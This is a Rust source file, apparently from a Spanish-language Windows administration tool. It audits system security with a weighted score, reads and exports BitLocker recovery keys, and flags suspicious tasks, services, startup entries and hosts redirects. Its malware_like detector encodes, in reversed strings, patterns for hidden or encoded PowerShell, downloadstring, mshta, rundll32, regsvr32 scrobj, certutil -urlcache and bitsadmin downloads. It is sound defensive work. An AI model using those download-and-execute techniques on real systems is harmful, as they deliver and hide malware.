//! Seguridad del equipo: auditoría con nota 0-100, BitLocker (estado y copia de
//! las claves de recuperación), programas de riesgo desactualizados y
//! elementos sospechosos (tareas, servicios, inicio, extensiones, hosts).

use crate::diagnostics::collect::SystemHealth;
use crate::tweaks::journal::Op;
use crate::tweaks::TweakState;
use serde::{Deserialize, Serialize};
use std::sync::Mutex;
use std::time::{Duration, Instant};
use tauri::State;

fn query<T: serde::de::DeserializeOwned>(script: &str, secs: u64) -> Result<T, String> {
    let out = crate::ps::powershell_opts(script, crate::ps::Opts { timeout: Some(Duration::from_secs(secs)), task: None })?;
    serde_json::from_str(&out).map_err(|e| format!("Respuesta inesperada: {e}"))
}

// ---------- Datos que no recoge el diagnóstico ----------

#[derive(Serialize, Deserialize, Clone, Debug, Default)]
#[serde(rename_all = "camelCase", default)]
pub struct Volume {
    pub drive: String,
    /// 0 = sin protección, 1 = protegida, 2 = desconocido
    pub protection: u32,
    /// 0 descifrada, 1 cifrada, 2 cifrando, 3 descifrando, 4 cifrado en pausa, 5 descifrado en pausa
    pub conversion: u32,
    pub percent: u32,
    pub has_recovery_key: bool,
}

#[derive(Serialize, Deserialize, Clone, Debug, Default)]
#[serde(rename_all = "camelCase", default)]
pub struct Extra {
    /// Perfiles de firewall apagados (Domain, Private, Public).
    pub firewall_off: Vec<String>,
    pub firewall_known: bool,
    pub uac_enabled: Option<bool>,
    pub uac_level: Option<u32>,
    pub smb1: Option<bool>,
    pub rdp_enabled: Option<bool>,
    pub rdp_nla: Option<bool>,
    pub autorun_off: Option<bool>,
    /// `None` sin administrador.
    pub bitlocker: Option<Vec<Volume>>,
    pub defender_active: Option<bool>,
    pub pua: Option<bool>,
}

// Antes era un único script de ~90 s de margen: firewall/UAC/RDP/SMB1/autorun son
// lecturas de registro casi instantáneas, pero Defender (Get-MpComputerStatus,
// Get-MpPreference) y BitLocker (llamadas CIM) tardan segundos en cargar su
// módulo la primera vez. Separados, los tres corren a la vez en vez de uno
// detrás de otro: el diagnóstico tarda lo del más lento, no la suma.

const FAST_SCRIPT: &str = r#"
function Reg($p, $n) { try { (Get-ItemProperty -Path $p -Name $n -ErrorAction Stop).$n } catch { $null } }
$fw = @(Get-NetFirewallProfile -ErrorAction SilentlyContinue)
$sys = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
$ts = 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server'
$deny = Reg $ts 'fDenyTSConnections'
$nla = Reg "$ts\WinStations\RDP-Tcp" 'UserAuthentication'
$ar = Reg 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer' 'NoDriveTypeAutoRun'
$smb = try { (Get-SmbServerConfiguration -ErrorAction Stop).EnableSMB1Protocol } catch { $null }
[pscustomobject]@{
  firewallOff = @($fw | Where-Object { -not $_.Enabled } | ForEach-Object { "$($_.Name)" }); firewallKnown = $fw.Count -gt 0
  uacEnabled = if ($null -ne (Reg $sys 'EnableLUA')) { [int](Reg $sys 'EnableLUA') -eq 1 } else { $true }
  uacLevel = Reg $sys 'ConsentPromptBehaviorAdmin'
  smb1 = $smb
  rdpEnabled = if ($null -ne $deny) { [int]$deny -eq 0 } else { $null }
  rdpNla = if ($null -ne $nla) { [int]$nla -eq 1 } else { $null }
  autorunOff = if ($null -ne $ar) { [int]$ar -eq 255 } else { $false }
} | ConvertTo-Json -Compress
"#;

const DEFENDER_SCRIPT: &str = r#"
$mp = try { Get-MpComputerStatus -ErrorAction Stop } catch { $null }
$pref = try { Get-MpPreference -ErrorAction Stop } catch { $null }
[pscustomobject]@{
  defenderActive = if ($mp) { [bool]$mp.AntivirusEnabled -and [bool]$mp.RealTimeProtectionEnabled } else { $null }
  pua = if ($pref) { [int]$pref.PUAProtection -eq 1 } else { $null }
} | ConvertTo-Json -Compress
"#;

/// Para el diagnóstico: la nota solo mira el disco del sistema, así que se
/// consulta ese y sin pedir las claves de recuperación. En un equipo con varios
/// discos, esto pasa de segundos a décimas (cada volumen son dos llamadas CIM).
const BITLOCKER_FAST_SCRIPT: &str = r#"
$bl = $null
try {
  $sys = "$env:SystemDrive"
  $bl = @(Get-CimInstance -Namespace root\cimv2\security\microsoftvolumeencryption -ClassName Win32_EncryptableVolume -Filter "DriveLetter = '$sys'" -ErrorAction Stop | ForEach-Object {
    $c = Invoke-CimMethod -InputObject $_ -MethodName GetConversionStatus
    [pscustomobject]@{ drive = $_.DriveLetter; protection = [uint32]$_.ProtectionStatus; conversion = [uint32]$c.ConversionStatus; percent = [uint32]$c.EncryptionPercentage; hasRecoveryKey = $false }
  })
} catch {}
[pscustomobject]@{ bitlocker = $bl } | ConvertTo-Json -Depth 4 -Compress
"#;

/// Para la página de Seguridad: todos los volúmenes y si tienen clave de recuperación.
const BITLOCKER_SCRIPT: &str = r#"
$bl = $null
try {
  $bl = @(Get-CimInstance -Namespace root\cimv2\security\microsoftvolumeencryption -ClassName Win32_EncryptableVolume -ErrorAction Stop | Where-Object DriveLetter | ForEach-Object {
    $c = Invoke-CimMethod -InputObject $_ -MethodName GetConversionStatus
    $k = Invoke-CimMethod -InputObject $_ -MethodName GetKeyProtectors -Arguments @{ KeyProtectorType = [uint32]3 }
    [pscustomobject]@{ drive = $_.DriveLetter; protection = [uint32]$_.ProtectionStatus; conversion = [uint32]$c.ConversionStatus; percent = [uint32]$c.EncryptionPercentage; hasRecoveryKey = @($k.VolumeKeyProtectorID).Count -gt 0 }
  })
} catch {}
[pscustomobject]@{ bitlocker = $bl } | ConvertTo-Json -Depth 4 -Compress
"#;

#[derive(Deserialize, Default)]
#[serde(rename_all = "camelCase", default)]
struct FastExtra {
    firewall_off: Vec<String>,
    firewall_known: bool,
    uac_enabled: Option<bool>,
    uac_level: Option<u32>,
    smb1: Option<bool>,
    rdp_enabled: Option<bool>,
    rdp_nla: Option<bool>,
    autorun_off: Option<bool>,
}

#[derive(Deserialize, Default)]
#[serde(rename_all = "camelCase", default)]
struct DefenderExtra {
    defender_active: Option<bool>,
    pua: Option<bool>,
}

#[derive(Deserialize, Default)]
#[serde(rename_all = "camelCase", default)]
struct BitlockerExtra {
    bitlocker: Option<Vec<Volume>>,
}

/// Estado de BitLocker del disco del sistema, reutilizado unos minutos: apenas
/// cambia y consultarlo cuesta segundos (Windows tarda en responder aunque el
/// equipo no tenga BitLocker).
static BITLOCKER_CACHE: Mutex<Option<(Instant, Option<Vec<Volume>>)>> = Mutex::new(None);
const BITLOCKER_CACHE_FOR: Duration = Duration::from_secs(10 * 60);

fn bitlocker_for_audit() -> Option<Vec<Volume>> {
    // Sin administrador, Windows no da ningún volumen: no merece la pena esperar.
    if !crate::elevation::is_elevated() {
        return None;
    }
    if let Some((t, v)) = BITLOCKER_CACHE.lock().unwrap_or_else(|e| e.into_inner()).as_ref() {
        if t.elapsed() < BITLOCKER_CACHE_FOR {
            return v.clone();
        }
    }
    let v = query::<BitlockerExtra>(BITLOCKER_FAST_SCRIPT, 60).map(|b| b.bitlocker).unwrap_or_default();
    *BITLOCKER_CACHE.lock().unwrap_or_else(|e| e.into_inner()) = Some((Instant::now(), v.clone()));
    v
}

pub fn extra() -> Result<Extra, String> {
    // Los tres a la vez: el conjunto tarda lo del más lento, no la suma de los tres.
    let (fast, defender, bitlocker) = std::thread::scope(|s| {
        let fast = s.spawn(|| query::<FastExtra>(FAST_SCRIPT, 30));
        let defender = s.spawn(|| query::<DefenderExtra>(DEFENDER_SCRIPT, 60));
        let bitlocker = s.spawn(bitlocker_for_audit);
        (fast.join(), defender.join(), bitlocker.join())
    });
    // Solo si falla la parte rápida (registro) se considera un fallo real: Defender
    // y BitLocker suelen fallar sin administrador y eso ya lo expresan sus `Option`.
    let fast = fast.unwrap_or_else(|_| Err("fallo interno".into()))?;
    let defender = defender.unwrap_or_else(|_| Ok(DefenderExtra::default())).unwrap_or_default();
    let bitlocker = bitlocker.unwrap_or_default();
    Ok(Extra {
        firewall_off: fast.firewall_off,
        firewall_known: fast.firewall_known,
        uac_enabled: fast.uac_enabled,
        uac_level: fast.uac_level,
        smb1: fast.smb1,
        rdp_enabled: fast.rdp_enabled,
        rdp_nla: fast.rdp_nla,
        autorun_off: fast.autorun_off,
        bitlocker,
        defender_active: defender.defender_active,
        pua: defender.pua,
    })
}

/// Deja los módulos de Defender y BitLocker cargados en el grupo de PowerShell,
/// para que el primer diagnóstico del día no pague esa carga. Se llama una vez
/// al arrancar la app, en un hilo aparte, sin bloquear nada.
pub fn warm_up() {
    std::thread::spawn(|| {
        let _ = query::<DefenderExtra>(DEFENDER_SCRIPT, 60);
        let _ = bitlocker_for_audit();
    });
}

// ---------- Auditoría ----------

#[derive(Serialize, Deserialize, Clone, Debug, PartialEq)]
#[serde(rename_all = "camelCase")]
pub struct Fix {
    pub label: String,
    /// Página de la app (con `focus` opcional: id del ajuste a resaltar).
    pub page: Option<String>,
    pub focus: Option<String>,
    /// Acceso de Herramientas a abrir.
    pub tool: Option<String>,
}

fn tweak_fix(label: &str, id: &str) -> Option<Fix> {
    Some(Fix { label: label.into(), page: Some("security".into()), focus: Some(id.into()), tool: None })
}
fn page_fix(label: &str, page: &str) -> Option<Fix> {
    Some(Fix { label: label.into(), page: Some(page.into()), focus: None, tool: None })
}
fn tool_fix(label: &str, tool: &str) -> Option<Fix> {
    Some(Fix { label: label.into(), page: None, focus: None, tool: Some(tool.into()) })
}

#[derive(Serialize, Deserialize, Clone, Debug, PartialEq)]
#[serde(rename_all = "camelCase")]
pub struct Check {
    pub id: String,
    pub label: String,
    /// ok | warn | bad | unknown
    pub status: String,
    pub detail: String,
    pub weight: u32,
    pub fix: Option<Fix>,
}

#[derive(Serialize, Deserialize, Clone, Debug, Default)]
#[serde(rename_all = "camelCase")]
pub struct Audit {
    /// 0-100.
    pub score: u32,
    pub checks: Vec<Check>,
    /// Programas de riesgo con actualización pendiente.
    pub vulnerable: Vec<crate::software::SoftwareUpdate>,
}

/// Datos de las cuentas locales que usa la auditoría.
#[derive(Default, Clone, Debug)]
pub struct Accounts {
    pub active_admins: u32,
    pub builtin_admin_enabled: bool,
    pub guest_enabled: bool,
}

/// Programas que suelen tener fallos de seguridad explotados: si están desactualizados, cuentan.
const RISKY: &[&str] = &[
    "google.chrome", "mozilla.firefox", "brave.brave", "opera.opera", "vivaldi.vivaldi", "microsoft.edge",
    "oracle.java", "oracle.jdk", "oracle.jre", "eclipseadoptium", "adobe.acrobat", "adobe.reader", "foxit",
    "7zip.7zip", "rarlab.winrar", "videolan.vlc", "zoom.zoom", "teamviewer", "anydesk", "notepad++",
    "putty.putty", "winscp", "python.python", "openjs.nodejs", "git.git", "oracle.virtualbox", "wireshark",
    "microsoft.teams", "slacktechnologies.slack", "discord.discord", "telegram", "whatsapp", "spotify",
    "microsoft.dotnet", "microsoft.vcredist", "libreoffice", "thedocumentfoundation", "onlyoffice",
];

pub fn is_risky(id: &str) -> bool {
    let l = id.to_ascii_lowercase();
    RISKY.iter().any(|r| l.starts_with(r))
}

fn check(id: &str, label: &str, status: &str, detail: impl Into<String>, weight: u32, fix: Option<Fix>) -> Check {
    Check { id: id.into(), label: label.into(), status: status.into(), detail: detail.into(), weight, fix }
}

/// Días desde una fecha ISO (o `None`).
fn days_since(iso: &str) -> Option<i64> {
    let d = chrono::DateTime::parse_from_rfc3339(iso).ok().map(|d| d.with_timezone(&chrono::Utc)).or_else(|| {
        chrono::NaiveDate::parse_from_str(&iso[..iso.len().min(10)], "%Y-%m-%d").ok().and_then(|d| d.and_hms_opt(0, 0, 0)).map(|d| d.and_utc())
    })?;
    Some((chrono::Utc::now() - d).num_days())
}

/// Calcula la auditoría con los datos ya recogidos (función pura: se prueba sin tocar el sistema).
pub fn evaluate(sys: Option<&SystemHealth>, x: &Extra, acc: Option<&Accounts>, vulnerable: Vec<crate::software::SoftwareUpdate>) -> Audit {
    let mut c = Vec::new();

    // Antivirus
    let third_party: Vec<&String> = sys.map(|s| s.antivirus.iter().filter(|a| !a.to_lowercase().contains("defender")).collect()).unwrap_or_default();
    c.push(match (x.defender_active, third_party.is_empty()) {
        (_, false) => check("antivirus", "Antivirus activo", "ok", third_party.iter().map(|s| s.as_str()).collect::<Vec<_>>().join(", "), 20, None),
        (Some(true), true) => check("antivirus", "Antivirus activo", "ok", "Microsoft Defender con protección en tiempo real", 20, None),
        (Some(false), true) => check("antivirus", "Antivirus activo", "bad", "Defender está desactivado y no hay otro antivirus", 20, tool_fix("Abrir Seguridad de Windows", "set-security")),
        (None, true) => check("antivirus", "Antivirus activo", "unknown", "No se pudo comprobar", 20, None),
    });
    if third_party.is_empty() {
        if let Some(age) = sys.and_then(|s| s.signature_age_days) {
            let st = if age <= 3 { "ok" } else if age <= 7 { "warn" } else { "bad" };
            c.push(check("signatures", "Firmas del antivirus al día", st, format!("Actualizadas hace {age} días"), 8, (st != "ok").then(|| tool_fix("Abrir Seguridad de Windows", "set-security")).flatten()));
        }
        if let Some(p) = x.pua {
            c.push(check("pua", "Bloqueo de aplicaciones no deseadas", if p { "ok" } else { "warn" }, if p { "Activado" } else { "Desactivado: adware y barras pueden instalarse" }, 3, (!p).then(|| tweak_fix("Activar", "security.defender-pua")).flatten()));
        }
    }

    // Firewall
    c.push(if !x.firewall_known {
        check("firewall", "Firewall activo", "unknown", "No se pudo comprobar", 15, None)
    } else if x.firewall_off.is_empty() {
        check("firewall", "Firewall activo", "ok", "Activo en todas las redes", 15, None)
    } else {
        let public = x.firewall_off.iter().any(|p| p.eq_ignore_ascii_case("Public"));
        check("firewall", "Firewall activo", if public { "bad" } else { "warn" }, format!("Apagado en: {}", x.firewall_off.join(", ")), 15, tweak_fix("Activar el firewall", "security.firewall-on"))
    });

    // Actualizaciones
    c.push(match sys.and_then(|s| s.last_update.as_deref()).and_then(days_since) {
        Some(d) if d <= 40 => check("updates", "Windows actualizado", "ok", format!("Última actualización hace {d} días"), 15, None),
        Some(d) if d <= 75 => check("updates", "Windows actualizado", "warn", format!("Última actualización hace {d} días"), 15, page_fix("Ver Windows Update", "winupdate")),
        Some(d) => check("updates", "Windows actualizado", "bad", format!("Sin actualizar desde hace {d} días"), 15, page_fix("Ver Windows Update", "winupdate")),
        None => check("updates", "Windows actualizado", "unknown", "No se pudo comprobar", 15, page_fix("Ver Windows Update", "winupdate")),
    });

    // UAC
    c.push(match (x.uac_enabled, x.uac_level) {
        (Some(false), _) => check("uac", "Control de cuentas (UAC)", "bad", "Desactivado: cualquier programa obtiene permisos de administrador sin avisar", 10, tweak_fix("Restaurar UAC", "security.uac-default")),
        (_, Some(0)) => check("uac", "Control de cuentas (UAC)", "bad", "Configurado en «No notificar nunca»", 10, tweak_fix("Restaurar UAC", "security.uac-default")),
        (_, Some(5)) | (_, None) => check("uac", "Control de cuentas (UAC)", "ok", "Nivel recomendado", 10, None),
        _ => check("uac", "Control de cuentas (UAC)", "warn", "Nivel distinto del recomendado", 10, tweak_fix("Restaurar UAC", "security.uac-default")),
    });

    // BitLocker (disco del sistema)
    c.push(match &x.bitlocker {
        None => check("bitlocker", "Cifrado del disco (BitLocker)", "unknown", "Requiere administrador", 8, None),
        Some(vols) => {
            let sys_drive = std::env::var("SystemDrive").unwrap_or_else(|_| "C:".into()).to_ascii_uppercase();
            match vols.iter().find(|v| v.drive.eq_ignore_ascii_case(&sys_drive)) {
                Some(v) if v.protection == 1 => check("bitlocker", "Cifrado del disco (BitLocker)", "ok", "Disco del sistema cifrado. Guarda la clave de recuperación.", 8, page_fix("Ver BitLocker", "security")),
                Some(v) if v.conversion == 1 || v.conversion == 2 => check("bitlocker", "Cifrado del disco (BitLocker)", "warn", format!("Cifrado al {}% pero la protección está suspendida", v.percent), 8, page_fix("Ver BitLocker", "security")),
                _ => check("bitlocker", "Cifrado del disco (BitLocker)", "warn", "El disco del sistema no está cifrado: si roban el equipo, se leen los datos", 8, None),
            }
        }
    });

    // Arranque seguro y TPM (del diagnóstico)
    if let Some(sb) = sys.and_then(|s| s.secure_boot) {
        c.push(check("secureboot", "Arranque seguro", if sb { "ok" } else { "warn" }, if sb { "Activado" } else { "Desactivado en la BIOS/UEFI" }, 5, None));
    }
    if let Some(t) = sys.and_then(|s| s.tpm_ready) {
        c.push(check("tpm", "Chip de seguridad (TPM)", if t { "ok" } else { "warn" }, if t { "Presente y listo" } else { "No disponible o no listo" }, 3, None));
    }

    // SMB1
    if let Some(on) = x.smb1 {
        c.push(check("smb1", "SMB1 desactivado", if on { "bad" } else { "ok" }, if on { "Activo: protocolo obsoleto usado por WannaCry" } else { "Desactivado" }, 7, on.then(|| tweak_fix("Desactivar SMB1", "security.smb1-off")).flatten()));
    }

    // Escritorio remoto
    match x.rdp_enabled {
        Some(true) if x.rdp_nla == Some(false) => c.push(check("rdp", "Escritorio remoto", "bad", "Activo sin autenticación previa (NLA)", 5, tweak_fix("Exigir NLA", "security.rdp-nla"))),
        Some(true) => c.push(check("rdp", "Escritorio remoto", "warn", "Activo: desactívalo si nadie administra el equipo en remoto", 5, tweak_fix("Desactivar", "security.rdp-off"))),
        Some(false) => c.push(check("rdp", "Escritorio remoto", "ok", "Desactivado", 5, None)),
        None => {}
    }

    // Ejecución automática de USB
    if let Some(off) = x.autorun_off {
        c.push(check("autorun", "Ejecución automática de USB", if off { "ok" } else { "warn" }, if off { "Desactivada" } else { "Activa: un USB infectado puede ejecutar programas" }, 3, (!off).then(|| tweak_fix("Desactivar", "security.autorun-off")).flatten()));
    }

    // Cuentas
    if let Some(a) = acc {
        let (st, detail, fix) = if a.guest_enabled {
            ("bad", "La cuenta Invitado está activa".to_string(), tweak_fix("Desactivar Invitado", "security.guest-off"))
        } else if a.builtin_admin_enabled {
            ("warn", "El Administrador integrado está activo (objetivo habitual de ataques)".to_string(), page_fix("Ver usuarios", "users"))
        } else if a.active_admins > 2 {
            ("warn", format!("{} administradores activos: usa cuentas estándar para el día a día", a.active_admins), page_fix("Ver usuarios", "users"))
        } else {
            ("ok", format!("{} administrador(es) activo(s)", a.active_admins), None)
        };
        c.push(check("accounts", "Cuentas de usuario", st, detail, 5, fix));
    }

    // Programas de riesgo desactualizados
    let n = vulnerable.len();
    c.push(check(
        "software",
        "Programas de riesgo al día",
        if n == 0 { "ok" } else if n <= 2 { "warn" } else { "bad" },
        if n == 0 { "Navegadores, lectores de PDF y similares actualizados".to_string() } else { format!("{n} desactualizados: {}", vulnerable.iter().map(|v| v.name.as_str()).take(4).collect::<Vec<_>>().join(", ")) },
        8,
        (n > 0).then(|| page_fix("Actualizar", "security")).flatten(),
    ));

    let (mut got, mut total) = (0.0, 0.0);
    for ch in &c {
        let v = match ch.status.as_str() {
            "ok" => 1.0,
            "warn" => 0.5,
            "bad" => 0.0,
            _ => continue,
        };
        got += v * ch.weight as f64;
        total += ch.weight as f64;
    }
    let score = if total > 0.0 { (got / total * 100.0).round() as u32 } else { 0 };
    Audit { score, checks: c, vulnerable }
}

pub fn accounts() -> Option<Accounts> {
    let users = crate::users::list().ok()?;
    Some(Accounts {
        active_admins: users.iter().filter(|u| u.is_active_local_admin()).count() as u32,
        builtin_admin_enabled: users.iter().any(|u| u.builtin_kind() == Some("administrator") && u.is_enabled()),
        guest_enabled: users.iter().any(|u| u.builtin_kind() == Some("guest") && u.is_enabled()),
    })
}

/// Recoge todo (en paralelo) y calcula la nota.
pub fn audit() -> Result<Audit, String> {
    let (sys, x, acc, sw) = std::thread::scope(|s| {
        let sys = s.spawn(crate::diagnostics::collect::system);
        let x = s.spawn(extra);
        let acc = s.spawn(accounts);
        let sw = s.spawn(crate::software::list);
        (sys.join().ok().and_then(Result::ok), x.join().map_err(|_| "El recolector falló".to_string()), acc.join().ok().flatten(), sw.join().ok().and_then(Result::ok))
    });
    let x = x??;
    let vulnerable = sw.unwrap_or_default().into_iter().filter(|u| is_risky(&u.id)).collect();
    Ok(evaluate(sys.as_ref(), &x, acc.as_ref(), vulnerable))
}

#[tauri::command(async)]
pub fn security_audit() -> Result<Audit, String> {
    audit()
}

// ---------- BitLocker ----------

#[tauri::command(async)]
pub fn bitlocker_status() -> Result<Vec<Volume>, String> {
    if !crate::elevation::is_elevated() {
        return Err("Requiere ejecutar AdminOps como administrador.".into());
    }
    // Aquí sí interesan todos los volúmenes y sus claves de recuperación.
    Ok(query::<BitlockerExtra>(BITLOCKER_SCRIPT, 90)?.bitlocker.unwrap_or_default())
}

#[derive(Serialize, Deserialize, Debug)]
#[serde(rename_all = "camelCase")]
pub struct RecoveryKey {
    drive: String,
    id: String,
    key: String,
}

const KEYS_SCRIPT: &str = r#"
$out = @(Get-CimInstance -Namespace root\cimv2\security\microsoftvolumeencryption -ClassName Win32_EncryptableVolume -ErrorAction Stop | Where-Object DriveLetter | ForEach-Object {
  $v = $_
  $k = Invoke-CimMethod -InputObject $v -MethodName GetKeyProtectors -Arguments @{ KeyProtectorType = [uint32]3 }
  foreach ($id in @($k.VolumeKeyProtectorID)) {
    $p = Invoke-CimMethod -InputObject $v -MethodName GetKeyProtectorNumericalPassword -Arguments @{ VolumeKeyProtectorID = $id }
    if ($p.NumericalPassword) { [pscustomobject]@{ drive = $v.DriveLetter; id = $id; key = $p.NumericalPassword } }
  }
})
ConvertTo-Json -InputObject $out -Compress
"#;

fn recovery_keys() -> Result<Vec<RecoveryKey>, String> {
    if !crate::elevation::is_elevated() {
        return Err("Requiere ejecutar AdminOps como administrador.".into());
    }
    // Las claves nunca van al registro de actividad: pool con descripción propia.
    let out = crate::pspool::query(KEYS_SCRIPT, Some(Duration::from_secs(60)), "BitLocker: leer claves de recuperación")?;
    serde_json::from_str(&out).map_err(|e| format!("Respuesta inesperada: {e}"))
}

/// Muestra las claves (se piden a propósito, no forman parte de la auditoría).
#[tauri::command(async)]
pub fn bitlocker_keys(tweaks: State<'_, TweakState>) -> Result<Vec<RecoveryKey>, String> {
    let r = recovery_keys();
    tweaks.record(Op::Run, "BitLocker: consultar claves de recuperación", &r.as_ref().map(|_| ()).map_err(Clone::clone));
    r
}

/// Guarda las claves en un .txt en la carpeta elegida (normalmente un USB). Devuelve la ruta.
#[tauri::command(async)]
pub fn bitlocker_export(app: tauri::AppHandle, tweaks: State<'_, TweakState>) -> Result<Option<String>, String> {
    use tauri_plugin_dialog::DialogExt;
    let keys = recovery_keys()?;
    if keys.is_empty() {
        return Err("Ninguna unidad tiene contraseña de recuperación.".into());
    }
    let Some(dir) = app.dialog().file().blocking_pick_folder().and_then(|p| p.into_path().ok()) else { return Ok(None) };
    let host = sysinfo::System::host_name().unwrap_or_else(|| "equipo".into());
    let now = chrono::Local::now();
    let mut text = format!(
        "CLAVES DE RECUPERACIÓN DE BITLOCKER\r\nEquipo: {host}\r\nFecha: {}\r\n\r\nGuarda este archivo en un lugar seguro, fuera del equipo.\r\nWindows la pide si cambia el hardware, la BIOS o el arranque.\r\n",
        now.format("%Y-%m-%d %H:%M")
    );
    for k in &keys {
        text.push_str(&format!("\r\nUnidad: {}\r\nIdentificador: {}\r\nClave de recuperación: {}\r\n", k.drive, k.id, k.key));
    }
    let file = dir.join(format!("BitLocker-{host}-{}.txt", now.format("%Y%m%d-%H%M")));
    let result = std::fs::write(&file, text).map_err(|e| format!("No se pudo guardar: {e}"));
    tweaks.record(Op::Run, &format!("BitLocker: copia de {} clave(s) de recuperación", keys.len()), &result);
    result.map(|_| Some(file.display().to_string()))
}

// ---------- Elementos sospechosos ----------

#[derive(Serialize, Deserialize, Debug)]
#[serde(rename_all = "camelCase")]
pub struct Suspicious {
    /// task | service | startup | extension | hosts
    kind: String,
    name: String,
    detail: String,
    reason: String,
    /// Para tareas: ruta completa (permite desactivarla).
    #[serde(default)]
    id: Option<String>,
    /// Programa sin firmar en una carpeta temporal o de usuario (lo calcula el script).
    #[serde(default, skip_serializing)]
    temp_unsigned: bool,
}

const SUSPICIOUS_SCRIPT: &str = r#"
$bad = '(?i)\\(Temp|AppData\\Local\\Temp|Downloads|Users\\Public)\\|\\AppData\\(Roaming|Local)\\[^\\]+\.(exe|dll|bat|cmd|vbs|js|ps1)$'
$sigCache = @{}
function Unsigned($path) {
  if (-not $path -or -not (Test-Path -LiteralPath $path)) { return $false }
  if (-not $sigCache.ContainsKey($path)) { $sigCache[$path] = (Get-AuthenticodeSignature -LiteralPath $path -ErrorAction SilentlyContinue).Status -ne 'Valid' }
  $sigCache[$path]
}
function ExePath($cmd) {
  if (-not $cmd) { return $null }
  $c = [Environment]::ExpandEnvironmentVariables($cmd.Trim())
  if ($c.StartsWith('"')) { return $c.Substring(1, $c.IndexOf('"', 1) - 1) }
  $m = [regex]::Match($c, '(?i)^.+?\.(exe|dll|bat|cmd|vbs|js|ps1)'); if ($m.Success) { $m.Value } else { $c.Split(' ')[0] }
}
# Solo recoge datos: la comparación con patrones de malware se hace en AdminOps
# (esas palabras dentro de un script hacen que los antivirus lo bloqueen).
function TempUnsigned($cmd) {
  $p = ExePath $cmd
  [bool](($p -match $bad) -and (Unsigned $p))
}
$out = New-Object System.Collections.ArrayList
Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object { $_.TaskPath -notlike '\Microsoft\*' -and $_.State -ne 'Disabled' } | ForEach-Object {
  $t = $_
  foreach ($a in @($t.Actions)) {
    $cmd = "$($a.Execute) $($a.Arguments)".Trim()
    if ($cmd) { [void]$out.Add([pscustomobject]@{ kind = 'task'; name = $t.TaskName; detail = $cmd; reason = ''; tempUnsigned = (TempUnsigned $cmd); id = "$($t.TaskPath)$($t.TaskName)" }) }
  }
}
Get-CimInstance Win32_Service -ErrorAction SilentlyContinue | Where-Object { $_.PathName } | ForEach-Object {
  [void]$out.Add([pscustomobject]@{ kind = 'service'; name = $_.DisplayName; detail = $_.PathName; reason = ''; tempUnsigned = (TempUnsigned $_.PathName); id = $null })
}
foreach ($k in 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run', "$UserHive\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run') {
  $props = Get-ItemProperty -Path $k -ErrorAction SilentlyContinue
  if (-not $props) { continue }
  $props.PSObject.Properties | Where-Object { $_.Name -notlike 'PS*' } | ForEach-Object {
    [void]$out.Add([pscustomobject]@{ kind = 'startup'; name = $_.Name; detail = "$($_.Value)"; reason = ''; tempUnsigned = (TempUnsigned "$($_.Value)"); id = $null })
  }
}
$hosts = Join-Path $env:SystemRoot 'System32\drivers\etc\hosts'
Get-Content -LiteralPath $hosts -ErrorAction SilentlyContinue | Where-Object { $_ -match '^\s*[0-9a-f.:]+\s+\S' } | ForEach-Object {
  if ($_ -match '(?i)(microsoft|windowsupdate|windows\.com|google|bing|office|live\.com|avast|kaspersky|eset|malwarebytes|bitdefender|norton|mcafee)') {
    [void]$out.Add([pscustomobject]@{ kind = 'hosts'; name = 'Archivo hosts'; detail = $_.Trim(); reason = 'Redirige un dominio de Microsoft, Google o de un antivirus (lo hace mucho malware)'; id = $null })
  }
}
ConvertTo-Json -InputObject @($out) -Compress
"#;

#[tauri::command(async)]
pub fn suspicious_items() -> Result<Vec<Suspicious>, String> {
    let script = format!("{}{SUSPICIOUS_SCRIPT}", crate::target_user::script_prelude());
    let raw: Vec<Suspicious> = query(&script, 180)?;
    Ok(raw.into_iter().filter_map(judge).collect())
}

/// Comandos típicos de malware: PowerShell oculto o codificado, descargas con
/// herramientas de Windows, scripts sueltos. Se comprueba aquí y no dentro del
/// script de PowerShell, porque esas palabras hacen que el antivirus lo bloquee.
fn malware_like(cmd: &str) -> bool {
    // Las palabras se guardan AL REVÉS y se invierten al ejecutarse. Escritas tal
    // cual (o por trozos, que el compilador deja contiguos) quedarían dentro del
    // .exe y un antivirus podría tomar el propio detector por malware.
    let w = |reversed: &str| std::hint::black_box(reversed).chars().rev().collect::<String>();
    let c = cmd.to_lowercase();
    let words: Vec<&str> = c.split_whitespace().collect();
    let has = |x: &str| c.contains(x);
    let token = |t: &[String]| words.iter().any(|x| t.iter().any(|y| y == x));
    // -w hidden / -windowstyle hidden
    let hidden = words.windows(2).any(|p| matches!(p[0], "-w" | "-windowstyle") && p[1] == w("neddih"));
    // powershell / pwsh
    let ps = has(&w("llehsrewop")) || has(&w("hswp"));
    // -e, -ec, -en, -enc, -encodedcommand
    let encoded = token(&[w("e-"), w("ce-"), w("ne-"), w("cne-"), w("dnammocdedocne-")]);
    let iex = w("xei");
    // vbscript / javascript
    let script = has(&w("tpircsbv")) || has(&w("tpircsavaj"));
    // downloadstring
    let download = has(&w("gnirtsdaolnwod"));
    (ps && (encoded || hidden || download || words.iter().any(|x| *x == iex || x.starts_with(&format!("{iex}(")) || x.contains(&format!(";{iex}")))))
        // mshta con web o script
        || (has(&w("athsm")) && (has("http") || script))
        // wscript / cscript
        || has(&w("tpircsw"))
        || has(&w("tpircsc"))
        // rundll32 con web o javascript
        || (has(&w("23lldnur")) && (has("http") || has(&w("tpircsavaj"))))
        // regsvr32 con scrobj
        || (has(&w("23rvsger")) && has(&w("jborcs")))
        // certutil -urlcache
        || (has(&w("litutrec")) && has(&w("ehcaclru-")))
        // bitsadmin /transfer
        || (has(&w("nimdastib")) && has(&w("refsnart")))
}

fn judge(mut s: Suspicious) -> Option<Suspicious> {
    if s.kind == "hosts" {
        return Some(s);
    }
    s.reason = if malware_like(&s.detail) {
        "Comando típico de malware (PowerShell oculto, descargas, scripts)".into()
    } else if s.temp_unsigned {
        "Programa sin firmar en una carpeta temporal o de usuario".into()
    } else {
        return None;
    };
    Some(s)
}

/// Desactiva una tarea programada sospechosa (reversible desde el Programador de tareas).
#[tauri::command(async)]
pub fn disable_task(id: String, tweaks: State<'_, TweakState>) -> Result<(), String> {
    if !crate::elevation::is_elevated() {
